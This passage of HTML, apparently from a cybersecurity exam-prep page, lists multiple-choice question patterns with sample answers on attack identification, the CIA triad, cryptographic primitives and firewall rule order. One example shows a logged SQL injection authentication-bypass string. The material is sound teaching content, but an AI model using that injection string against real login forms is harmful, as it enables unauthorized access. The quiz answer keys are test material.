          <span class="mcq-correct">Answer: Reflected Cross-Site Scripting (XSS)</span>.<br><br>
          <strong>Example B:</strong> Log: `SELECT * FROM users WHERE user='' OR 1=1-- AND pass=''`. Which attack occurred?<br>
          <span class="mcq-correct">Answer: SQL Injection (Authentication Bypass)</span>.
        </div>
      </div>

      <!-- Pattern 8 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 8 · CIA Triad Mapping</div>
        <p class="pattern-desc">Asks which specific pillar (C, I, or A) is compromised by a specific incident.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> An unauthenticated attacker modifies bank account balances in a database.<br>
          <span class="mcq-correct">Answer: Integrity</span>.<br><br>
          <strong>Example B:</strong> An attacker steals an unencrypted backup tape containing customer SSNs.<br>
          <span class="mcq-correct">Answer: Confidentiality</span>.
        </div>
      </div>

      <!-- Pattern 9 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 9 · Cryptography Primitive Selection</div>
        <p class="pattern-desc">Asks which cryptographic primitive (symmetric, asymmetric, hash, signature, certificate) fits a scenario.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> A developer needs to verify that a downloaded 4 GB ISO file was not corrupted or modified.<br>
          <span class="mcq-correct">Answer: Cryptographic Hash (SHA-256 checksum)</span>.<br><br>
          <strong>Example B:</strong> A server needs to encrypt 500 gigabytes of database records on disk with high throughput.<br>
          <span class="mcq-correct">Answer: Symmetric Encryption (AES-256)</span>.
        </div>
      </div>

      <!-- Pattern 10 -->
      <div class="mcq-pattern-card">
        <div class="pattern-badge">Pattern 10 · Firewall Rule Logic</div>
        <p class="pattern-desc">Evaluates understanding of sequential rule evaluation and default-deny policies.</p>
        <div class="mcq-example">
          <strong>Example A:</strong> If rule 1 allows port 80 and rule 2 denies IP X on port 80, will traffic from IP X be allowed?<br>
          <span class="mcq-correct">Answer: Yes, because firewalls terminate evaluation on First-Match</span>.<br><br>
          <strong>Example B:</strong> What does an 'Implicit Deny' rule at the bottom of a firewall policy do?<br>
          <span class="mcq-correct">Answer: Drops all traffic that does not match any explicit permit rule</span>.
        </div>
      </div>

    </div>
  </div>
</section>
"""
